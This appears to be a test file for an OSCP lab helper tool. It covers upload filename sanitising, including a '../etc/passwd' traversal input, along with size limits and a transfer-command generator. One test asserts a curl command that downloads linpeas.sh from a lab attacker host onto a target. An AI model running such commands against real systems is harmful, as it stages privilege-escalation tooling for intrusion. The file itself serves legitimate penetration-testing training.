import assert from "node:assert/strict";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import { saveUpload, removeUpload, uploadName, uploadLengthStatus, uploadRequestTooLarge, UPLOAD_BATCH_CAP, UPLOAD_REQUEST_CAP } from "./uploads.server.ts";
import { transferPlan } from "./transfer-plan.ts";

test("an upload name is the file, not a path", () => {
  assert.equal(uploadName("linpeas.sh"), "linpeas.sh");
  assert.equal(uploadName("C:\\Users\\Public\\chisel.exe"), "chisel.exe");
  assert.equal(uploadName("../etc/passwd"), "passwd");
  assert.equal(uploadName(".hidden"), null);
});

test("a saved upload lands in the uploads folder", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "oscp-uploads-"));
  process.env.OSCP_UPLOADS = dir;
  try {
    const saved = await saveUpload("note.txt", Buffer.from("hello"));
    assert.ok(!("error" in saved));
    const again = await saveUpload("note.txt", Buffer.from("second"));
    assert.ok("error" in again);
    const replaced = await saveUpload("note.txt", Buffer.from("second"), true);
    assert.ok(!("error" in replaced));
    assert.equal(await readFile(path.join(dir, "note.txt"), "utf8"), "second");
    const removed = await removeUpload("note.txt");
    assert.ok(!("error" in removed));
    await assert.rejects(readFile(path.join(dir, "note.txt"), "utf8"));
  } finally {
    delete process.env.OSCP_UPLOADS;
    await rm(dir, { recursive: true, force: true });
  }
});

test("an upload bigger than 210 MB is refused before the body is read", () => {
  assert.equal(uploadRequestTooLarge(null), false);
  assert.equal(uploadRequestTooLarge(String(UPLOAD_REQUEST_CAP)), false);
  assert.equal(uploadRequestTooLarge(String(UPLOAD_REQUEST_CAP + 1)), true);
  assert.equal(UPLOAD_BATCH_CAP, 10);
  assert.equal(uploadLengthStatus(null), 411);
  assert.equal(uploadLengthStatus(""), 411);
  assert.equal(uploadLengthStatus(String(UPLOAD_REQUEST_CAP + 1)), 413);
  assert.equal(uploadLengthStatus("12"), null);
});

test("the transfer command uses port 80 and the file name", () => {
  const plan = transferPlan({ host: "10.10.14.5", port: "80", file: "linpeas.sh", os: "linux", client: "curl" });
  assert.ok(!("error" in plan));
  assert.equal(plan.command, "curl -o /tmp/linpeas.sh http://10.10.14.5:80/linpeas.sh");
});
